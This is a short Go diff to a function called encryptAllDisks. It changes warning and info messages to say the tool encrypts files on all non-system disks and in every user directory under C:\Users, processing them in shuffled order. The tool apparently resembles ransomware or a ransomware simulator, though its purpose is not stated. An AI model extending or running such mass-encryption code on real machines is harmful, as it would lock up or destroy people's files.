@@ -774,7 +774,7 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("SCAN RANGE:")
 	utils.PrintWarning("  - All disks except C:\\: %v", disks)
-	utils.PrintWarning("  - All user desktop directories: C:\\Users\\*\\Desktop")
+	utils.PrintWarning("  - All user directories: C:\\Users\\*\\")
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("WARNING: This will encrypt files across ALL disks!")
 	utils.PrintWarning("Only files matching --include patterns will be encrypted.")
@@ -850,7 +850,7 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 
 	// Process all user Desktop directories from C:\Users
 	if len(desktopDirs) > 0 {
-		utils.PrintInfo("Processing Desktop directories from C:\\Users (%d directories)", len(desktopDirs))
+		utils.PrintInfo("Processing user directories from C:\\Users (%d directories)", len(desktopDirs))
 
 		// Shuffle Desktop directories for random processing order
 		utils.ShuffleStrings(desktopDirs)
